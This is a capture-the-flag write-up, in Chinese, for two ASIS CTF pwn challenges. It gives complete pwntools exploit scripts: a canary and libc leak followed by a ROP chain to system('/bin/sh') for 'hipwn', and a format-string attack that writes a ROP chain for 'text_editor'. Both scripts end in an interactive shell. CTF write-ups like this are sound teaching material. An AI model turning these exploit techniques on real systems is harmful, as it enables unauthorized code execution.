# ASISCTF_pwnWP

### pwn|hipwn

版本是ubuntu22，这个版本下将pop rdi等传统ROP里会用到的gadget全给移除了。不过这个题我们还是可以先泄露出canary，然后泄露出libc。等泄露出libc的时候我们就可以使用libc里的gadget和system函数来拿到shell了。

exp:

```python
from pwn import *
import sys
remote_addr = ["45.153.243.57",1337]
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
elf = ELF('./chall')
if len(sys.argv) == 1:
    context.log_level="debug" 
    #p = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu/", "-g","1234","./stack"]) 
    #p = process(["qemu-aarch64", "-L", ".", "./stack"]) 
    p = process("./chall")
    context(arch='amd64', os='linux')
    context.terminal = ['tmux', 'splitw', '-h']
if len(sys.argv) == 2 :
    if 'r' in sys.argv[1]:
        p = remote(remote_addr[0],remote_addr[1])
    if 'n' not in sys.argv[1]:
        context.log_level="debug" 
        #context(arch = 'amd64', os = 'linux')
r = lambda : p.recv()
rl = lambda : p.recvline()
rc = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()
pr = lambda name,x : log.info(name+':'+hex(x))

DEBUG = 0

def debug(bp = None):
    if DEBUG == 1:
        if bp != None:
            gdb.attach(p, bp)
        else:
            gdb.attach(p)

debug('''
    b *$rebase(0x1256)
''')

sla(b'How much???\n', str(0x100).encode())
payload = b'a' * (0x48) + b'b'
sa(b'content\n', payload)

ru(b'\x62')
canary = u64(rc(7).ljust(8, b'\x00')) << 8
pr('canary', canary)

sla(b'again?', str(1337).encode())

sla(b'How much???\n', str(0x100).encode())
payload = b'a' * (0x48) + p64(canary + 1) + b'a' * 8 + b'b'
sa(b'content\n', payload)
libc.address = u64(ru(b'\x7f')[-6:].ljust(8, b'\x00')) - 0x29d62
pr('libc.address', libc.address)
pop_rdi = libc.address + 0x2a3e5
system = libc.sym['system']
binsh = next(libc.search(b'/bin/sh\x00'))
ret = libc.address + 0x29cd6

sla(b'again?', str(1337).encode())

sla(b'How much???\n', str(0x100).encode())
payload = b'a' * (0x48) + p64(canary) + b'a' * 8 + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)
sa(b'content\n', payload)

sla(b'again?', str(0).encode())

shell()

```

### pwn| text_editor

程序有几个功能：

![image-20230926140525302](https://raw.githubusercontents.com/BattiestStone4/imgs/master/2023/09/1695708349.png)

其中edit_text接受用户输入放入bss段上的text变量，位于程序基地址+0x4020处。而save_text将bss上text变量的内容复制到栈上。show_error则是打印了程序基地址+0x4120处的内容，且存在格式化字符串漏洞。

![image-20230926140912348](https://raw.githubusercontents.com/BattiestStone4/imgs/master/2023/09/1695708579.png)

![image-20230926140923647](https://raw.githubusercontents.com/BattiestStone4/imgs/master/2023/09/1695708578.png)

![image-20230926140935028](https://raw.githubusercontents.com/BattiestStone4/imgs/master/2023/09/1695708576.png)

可见对text编辑我们可以操控4120处的内容。于是我们可以先改低地址来泄露libc基地址，这里有1/16概率。

然后我们泄露基地址之后就可以使用格式化字符串漏洞对ret_addr进行编辑，这里采用了写rop的方式。

exp：

```python
from pwn import *
import sys
remote_addr = ["",]
libc = ELF('./libc.so.6')
#elf = ELF('')
if len(sys.argv) == 1:
    context.log_level="debug" 
    #p = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu/", "-g","1234","./stack"]) 
    #p = process(["qemu-aarch64", "-L", ".", "./stack"]) 
    p = process("./chall")
    context(arch='amd64', os='linux')
    context.terminal = ['tmux', 'splitw', '-h']
if len(sys.argv) == 2 :
    if 'r' in sys.argv[1]:
        p = remote(remote_addr[0],remote_addr[1])
    if 'n' not in sys.argv[1]:
        context.log_level="debug" 
        #context(arch = 'amd64', os = 'linux')
r = lambda : p.recv()
rl = lambda : p.recvline()
rc = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()
pr = lambda name,x : log.info(name+':'+hex(x))

DEBUG = 0

def debug(bp = None):
    if DEBUG == 1:
        if bp != None:
            gdb.attach(p, bp)
        else:
            gdb.attach(p)

debug('''
    b *$rebase(0x1346)
''')

def edit(content):
    sla(b'> ', b'1')
    sa(b'text: ', content)

def save():
    sla(b'> ', b'2')

def exit():
    sla(b'> ', b'3')

def pf():
    sla(b'> ', b'4')


payload = b'\x00' * 0x100 + b'\x40\x31'
edit(payload)
save()
pf()

sleep(1) #1/16 

libc.address = u64(ru(b'\x7f')[-6:].ljust(8, b'\x00')) - 0x21a780
pr('libc.address', libc.address)

pop_rdi = libc.address + 0x2a3e5
pop_rbp = libc.address + 0x35732
ret = libc.address + 0xf8098

system = libc.sym['system']
binsh = next(libc.search(b'/bin/sh\x00'))
environ = libc.sym['__environ']

payload = b'\x00' * 0x100 + p64(environ)
edit(payload)
save()
pf()

sleep(1)

stack_addr = u64(ru(b'\x7f')[-6:].ljust(8, b'\x00'))
pr('stack_addr', stack_addr)

begin_addr = stack_addr - 0x238
ret_addr = begin_addr + 0x118

payload = fmtstr_payload(10, {ret_addr + 0x8:p64(pop_rdi)}, write_size='short')
payload = payload.ljust(0x100, b'\x00') + p64(begin_addr)
edit(payload)
save()
pf()

sleep(1)

payload = fmtstr_payload(10, {ret_addr + 0x10:p64(binsh)}, write_size='short')
payload = payload.ljust(0x100, b'\x00') + p64(begin_addr)
edit(payload)
save()
pf()

sleep(1)

payload = fmtstr_payload(10, {ret_addr + 0x18:p64(system)}, write_size='short')
payload = payload.ljust(0x100, b'\x00') + p64(begin_addr)
edit(payload)
save()
pf()

sleep(1)

payload = fmtstr_payload(10, {ret_addr:p64(ret)}, write_size='short')
payload = payload.ljust(0x100, b'\x00') + p64(begin_addr)
edit(payload)
save()
pf()

exit()

shell()
```

